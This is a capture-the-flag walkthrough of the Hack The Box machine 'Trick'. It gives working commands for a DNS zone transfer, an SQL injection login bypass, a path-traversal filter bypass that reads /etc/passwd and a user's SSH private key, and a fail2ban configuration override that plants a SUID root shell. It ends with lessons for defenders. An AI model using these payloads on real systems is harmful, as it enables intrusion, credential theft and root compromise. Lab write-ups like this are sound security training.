# HTB: Trick — Full Walkthrough
**Difficulty:** Easy  
**OS:** Linux  
**Attacker IP:** 10.10.16.84  
**Target IP:** 10.129.227.180  

---

## Table of Contents
1. [Mindset & Methodology](#mindset)
2. [Step 1 — Port Scanning](#step-1)
3. [Step 2 — DNS Zone Transfer](#step-2)
4. [Step 3 — Hosts File Setup](#step-3)
5. [Step 4 — SQL Injection Auth Bypass](#step-4)
6. [Step 5 — Subdomain Fuzzing](#step-5)
7. [Step 6 — LFI Discovery & Exploitation](#step-6)
8. [Step 7 — Reading michael's SSH Key](#step-7)
9. [Step 8 — SSH Access & User Flag](#step-8)
10. [Step 9 — Privilege Escalation via fail2ban](#step-9)
11. [Root Flag](#root-flag)
12. [Lessons Learned](#lessons)

---

## Mindset & Methodology <a name="mindset"></a>

Before touching the target, a good hacker follows a structured methodology:

**Enumerate → Exploit → Escalate**

Every action has a reason. You never blindly run tools — you ask:
- *What am I looking for?*
- *What does this tell me?*
- *What are my next options based on this information?*

This machine is a perfect example of **chaining small vulnerabilities** — no single step gives you root. You chain DNS info → SQLi → subdomain discovery → LFI → SSH key → fail2ban abuse. Each step unlocks the next.

---

## Step 1 — Port Scanning <a name="step-1"></a>

### What we ran
```bash
nmap -p- --min-rate 10000 10.129.227.180
nmap -p 22,25,53,80 -sCV 10.129.227.180
```

### Results
```
22/tcp open  ssh
25/tcp open  smtp
53/tcp open  domain
80/tcp open  http
```

### Why we do this
Port scanning is always the first step. You can't attack what you don't know exists. We use two nmap passes:

1. **`-p- --min-rate 10000`** — scan all 65535 ports quickly. Default nmap only scans the top 1000. Services on unusual ports get missed.
2. **`-sCV`** — on the discovered ports, run service detection (`-sV`) and default scripts (`-sC`) to get version info and basic enumeration.

### Hacker mindset
Look at what's *unusual*. Every machine has SSH (22) and HTTP (80) — that's expected. But **port 25 (SMTP)** and **port 53 (DNS)** stand out on what appears to be a web server. Ask yourself: *why would a web server be running a mail server and a DNS server?* These are your attack surface hints. Always note unusual services — they almost always matter.

---

## Step 2 — DNS Zone Transfer <a name="step-2"></a>

### What we ran
```bash
dig axfr trick.htb @10.129.227.180
```

### Results
```
preprod-payroll.trick.htb.  604800  IN  CNAME  trick.htb.
```

### Why we do this
DNS on port 53 is interesting because DNS servers store a map of all hostnames for a domain. A **zone transfer (AXFR)** is a legitimate DNS feature designed to let secondary DNS servers sync records from a primary server. When misconfigured (no IP restrictions), anyone can request a full dump of all DNS records.

The `dig axfr` command asks the DNS server at 10.129.227.180 to give us all records for the `trick.htb` zone.

### What this reveals
The zone transfer reveals `preprod-payroll.trick.htb` — a subdomain that wouldn't appear in a normal port scan or web crawl. This is a **virtual host** — the same IP serves different content depending on what `Host:` header you send in your HTTP request.

### Hacker mindset
DNS is a gold mine for reconnaissance. Before zone transfers were locked down, attackers could map entire corporate networks just by asking DNS servers. Even today, misconfigured DNS on CTF machines (and real targets) leaks internal hostnames, development environments, staging servers, and admin panels. Always check DNS when port 53 is open.

---

## Step 3 — Hosts File Setup <a name="step-3"></a>

### What we ran
```bash
echo "10.129.227.180 trick.htb preprod-payroll.trick.htb" | sudo tee -a /etc/hosts
```

### Why we do this
Virtual hosting means the web server uses the HTTP `Host:` header to decide which site to serve. Your browser normally resolves hostnames through DNS, but this is an HTB machine — its DNS isn't on the public internet.

By adding entries to `/etc/hosts`, we force our machine to resolve these hostnames to the target IP without needing public DNS. This is essential for accessing virtual hosts.

### Hacker mindset
Every subdomain you discover needs to go into `/etc/hosts` immediately. If you skip this and try to browse directly, you'll get the default site or a 404. Always keep your hosts file updated as you discover new subdomains throughout the engagement.

---

## Step 4 — SQL Injection Auth Bypass <a name="step-4"></a>

### What we found
Browsing to `http://preprod-payroll.trick.htb` reveals an "Employee's Payroll Management System" login form. This is real, publicly available software — a quick Google of the title confirms it.

### What we ran
```bash
curl -s -c cookies.txt -b cookies.txt -X POST \
  "http://preprod-payroll.trick.htb/ajax.php?action=login" \
  -d "username=' or 1=1-- -&password=anything"
```

### Result: `1` (login successful)

### Why this works
The backend SQL query looks something like this:
```sql
SELECT * FROM users WHERE username = '[input]' AND password = '[input]';
```

When we inject `' or 1=1-- -` as the username, the query becomes:
```sql
SELECT * FROM users WHERE username = '' OR 1=1-- -' AND password = 'anything';
```

The `-- -` comments out the rest of the query. `OR 1=1` is always true, so the query returns all users. The application sees a successful login and grants admin access.

### Why we tried this
The login form is the natural entry point. Any time you see a login form backed by a database (and PHP/MySQL is extremely common), SQL injection should be your first test. A single quote `'` in the username field breaking the page is often the first indicator.

### Hacker mindset
SQL injection auth bypasses are one of the oldest and most reliable attacks. The pattern `' or 1=1-- -` is a classic. Real software downloaded from the internet (like this Payroll Management System) is frequently vulnerable because developers prioritize features over security. When you identify off-the-shelf software, also search for CVEs — this specific bypass is **CVE-2022-28468**.

---

## Step 5 — Subdomain Fuzzing <a name="step-5"></a>

### What we ran
```bash
wfuzz -u http://trick.htb \
  -H "Host: preprod-FUZZ.trick.htb" \
  -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt \
  --hh 5480 -t 50
```

### Result
```
000000254:   200    178 L    631 W    9660 Ch    "marketing"
```

Found: `preprod-marketing.trick.htb`

### Why we do this
The zone transfer gave us `preprod-payroll`. The `preprod-` prefix is a naming pattern. Developers often follow consistent naming conventions for their environments (preprod, staging, dev, test). By fuzzing for other `preprod-*` subdomains, we discover more attack surface.

`wfuzz` works by sending HTTP requests, each time with a different value in the `Host:` header (where `FUZZ` gets replaced by each word in the list). The `--hh 5480` flag filters out responses with 5480 characters — that's the size of the default homepage, so we only see responses that are *different*.

### Added to hosts
```bash
echo "10.129.227.180 preprod-marketing.trick.htb" | sudo tee -a /etc/hosts
```

### Hacker mindset
Never assume the zone transfer gave you everything. DNS misconfigurations may only expose some records. Fuzzing for virtual hosts is an independent discovery technique that doesn't rely on DNS at all — it directly asks the web server. The combination of both techniques gives you maximum coverage.

---

## Step 6 — LFI Discovery & Exploitation <a name="step-6"></a>

### What we observed
Browsing to `preprod-marketing.trick.htb`, we notice the URL structure:
```
http://preprod-marketing.trick.htb/index.php?page=services.html
```

The `page=` parameter tells the server which file to include. This is a classic pattern for **Local File Inclusion (LFI)**.

### The vulnerable code
Reading the source (via SQL injection file read from the payroll site), the marketing site's `index.php` contains:
```php
$file = $_GET['page'];
if(!isset($file) || ($file=="index.php")) {
    include("/var/www/market/home.html");
} else {
    include("/var/www/market/".str_replace("../","",$file));
}
```

### The filter bypass
The developer tried to prevent path traversal by removing `../` with `str_replace`. This is **insecure** because `str_replace` only removes the pattern once, non-recursively. The trick:

```
Input:  ....//....//etc/passwd
After:  ../  ../  etc/passwd   ← str_replace removes ../ once
Result: ../../etc/passwd        ← which IS a valid traversal
```

So `....//` becomes `../` after the filter runs.

### Testing LFI
```bash
curl -s "http://preprod-marketing.trick.htb/index.php?page=....//....//....//....//etc/passwd"
```

This returns the contents of `/etc/passwd` — LFI confirmed.

### Why this matters
LFI lets you read any file on the server that the PHP process has permission to read. This includes:
- `/etc/passwd` — list of users
- SSH private keys
- Config files with passwords
- Source code of other applications
- Log files (can lead to RCE via log poisoning)

### Hacker mindset
Any time you see a `page=`, `file=`, `path=`, `include=`, or similar parameter in a URL, test for LFI immediately. The `str_replace` defense is a well-known bad practice — a blacklist approach to security almost always fails because attackers find creative ways around it. Whitelisting (only allowing specific known-good values) is the correct defense.

---

## Step 7 — Reading michael's SSH Key <a name="step-7"></a>

### What we ran
```bash
curl -s "http://preprod-marketing.trick.htb/index.php?page=....//....//....//....//home/michael/.ssh/id_rsa"
```

### Why michael?
From the `/etc/passwd` file we read earlier, michael is the only non-root user with a login shell:
```
michael:x:1001:1001::/home/michael:/bin/bash
```

Also, the nginx config (found earlier via SQL injection file read) reveals that the marketing site runs PHP as michael via `php7.3-fpm-michael.sock`. This means the PHP process has michael's file permissions — including read access to michael's home directory.

### Why SSH keys?
SSH keys in `~/.ssh/id_rsa` are private keys used for passwordless SSH authentication. If the public key (`id_rsa.pub`) is in `authorized_keys` (which is the default setup), we can use the private key to log in as that user without knowing their password.

### Saving and using the key
```bash
curl -s "http://preprod-marketing.trick.htb/index.php?page=....//....//....//....//home/michael/.ssh/id_rsa" > /tmp/michael_id_rsa
chmod 600 /tmp/michael_id_rsa
```

The `chmod 600` is critical — SSH refuses to use private key files that are readable by others (a security feature of the SSH client).

### Hacker mindset
Once you have LFI as a specific user, immediately look for SSH keys. `~/.ssh/id_rsa` is the default location and exists on a huge number of Linux systems. This is often faster and more reliable than trying to achieve code execution through log poisoning or mail injection. Always take the path of least resistance.

---

## Step 8 — SSH Access & User Flag <a name="step-8"></a>

### What we ran
```bash
ssh -i /tmp/michael_id_rsa michael@10.129.227.180
```

### Result
```
michael@trick:~$ cat user.txt
a20a41[redacted]af5aa46bd
```

### Hacker mindset
After getting a shell, the first things to check are always:
1. **Who am I?** — `id`
2. **What groups am I in?** — `id` (check for unusual groups)
3. **What can I run as root?** — `sudo -l`
4. **What's in my home directory?** — `ls -la ~`
5. **What other users exist?** — `cat /etc/passwd`

Notice michael is in the `security` group — a non-standard group. This is a flag that something unusual has been configured. Always investigate non-standard groups.

---

## Step 9 — Privilege Escalation via fail2ban <a name="step-9"></a>

### Discovery
```bash
sudo -l
```
Output:
```
(root) NOPASSWD: /etc/init.d/fail2ban restart
```

Michael can restart fail2ban as root without a password.

```bash
find / -group security 2>/dev/null
```
Output:
```
/etc/fail2ban/action.d
```

The `action.d` directory is writable by the `security` group:
```
drwxrwx--- 2 root security 4096 action.d
```

### Understanding fail2ban
fail2ban is a security tool that monitors log files for repeated failed login attempts and bans offending IPs using firewall rules (iptables). Its configuration has three parts:

- **Filters** — regex patterns to detect failures in log files
- **Actions** — what to do when a threshold is hit (e.g., add an iptables rule)
- **Jails** — connect a filter to an action for a specific service

The default action for SSH banning is `iptables-multiport`, which calls `iptables` (defined in `iptables-common.conf`) to block the IP.

### The vulnerability
`iptables-common.conf` has this directive:
```ini
[INCLUDES]
after = iptables-common.local
```

The `after =` directive means fail2ban will load `iptables-common.local` after the main config, allowing values to be overridden. Crucially, **this file doesn't exist yet** — and we can create new files in `action.d` (we just can't overwrite existing ones).

The `iptables` variable in `iptables-common.conf` defines the actual command called when banning:
```ini
iptables = iptables <lockingopt>
```

We can override this in our new `iptables-common.local` to point to our own malicious script.

### The exploit — step by step

**1. Create the malicious "iptables" script:**
```bash
echo -e '#!/bin/bash\ncp /bin/bash /tmp/bash; chmod 4777 /tmp/bash' > /tmp/iptables
chmod +x /tmp/iptables
```
This script, when run as root by fail2ban, copies bash to `/tmp/bash` and sets the SUID bit. SUID means the binary runs with the file owner's permissions (root), regardless of who executes it.

**2. Create the fail2ban override:**
```bash
echo -e '[Init]\niptables = /tmp/iptables <lockingopt>' > /etc/fail2ban/action.d/iptables-common.local
```
This tells fail2ban to use our malicious script instead of the real iptables when banning.

**3. Restart fail2ban to load the new config:**
```bash
sudo /etc/init.d/fail2ban restart
```
fail2ban restarts as root and loads our override.

**4. Trigger a ban by making 5+ failed SSH attempts:**
```bash
for i in {1..7}; do sshpass -p wrongpass ssh -o StrictHostKeyChecking=no wronguser@10.129.227.180 2>/dev/null; done
```
After 5 failures (the `maxretry` threshold), fail2ban fires the `actionban` command — which calls our fake iptables script — which runs as root — which creates `/tmp/bash` with SUID.

**5. Exploit the SUID bash:**
```bash
/tmp/bash -p
```
The `-p` flag tells bash to preserve the effective UID (euid=root) instead of dropping it. Without `-p`, bash would drop the SUID privilege as a security measure.

### Why this works
fail2ban runs as root. When it executes our fake iptables binary, that process inherits root privileges. The `cp /bin/bash /tmp/bash; chmod 4777` command creates a root-owned SUID binary we can use to get a root shell at any time.

### Hacker mindset
The privilege escalation chain here requires connecting several dots:
1. `sudo -l` → can restart fail2ban (most people would look at GTFOBins and stop here)
2. `id` → in `security` group (non-standard, investigate it)
3. `find / -group security` → the `security` group owns `action.d`
4. Understanding fail2ban's include/override mechanism → `iptables-common.local` doesn't exist, we can create it
5. Knowing that fail2ban runs as root → our malicious command runs as root

This is the hacker mindset: **don't look for a single magic vulnerability, look for a chain of small misconfigurations that combine into full compromise**.

---

## Root Flag <a name="root-flag"></a>

```bash
bash-5.0# cat /root/root.txt
7a15f29[redacted]c9b01c2d
```

---

## Lessons Learned <a name="lessons"></a>

### Vulnerabilities exploited
| Vulnerability | Location | Impact |
|---|---|---|
| DNS zone transfer unrestricted | Port 53 | Subdomain enumeration |
| SQL injection (CVE-2022-28468) | preprod-payroll login | Auth bypass, file read |
| LFI via path traversal | preprod-marketing `?page=` | Read arbitrary files as michael |
| Insecure `str_replace` filter | marketing `index.php` | Filter bypass |
| SSH private key exposure | `/home/michael/.ssh/id_rsa` | SSH access as michael |
| fail2ban writable action.d | `/etc/fail2ban/action.d/` | Arbitrary command execution as root |
| NOPASSWD sudo on fail2ban | sudoers | Ability to reload malicious config |

### Key takeaways for defenders
1. **Restrict DNS zone transfers** to specific trusted IPs only
2. **Use prepared statements** for all SQL queries — never concatenate user input
3. **Never use blacklist filtering** (str_replace, str_ireplace) for security — use a whitelist
4. **Restrict SSH key permissions** and don't leave private keys world-readable
5. **Audit group permissions** — non-standard groups with write access to security tool configs are dangerous
6. **NOPASSWD sudo entries** dramatically reduce the effort needed to escalate from a compromised account to root

### Key takeaways for attackers
1. Check **every unusual open port** — DNS and SMTP both contributed here
2. Always **fuzz for virtual hosts** when you see a web server
3. **LFI → SSH key** is often faster than LFI → RCE
4. After getting a shell: **`sudo -l` and `id` immediately** — always
5. Non-standard groups in `id` output are almost always relevant to privilege escalation
6. Understanding *how* a tool works (fail2ban's include mechanism) is more powerful than just knowing it exists
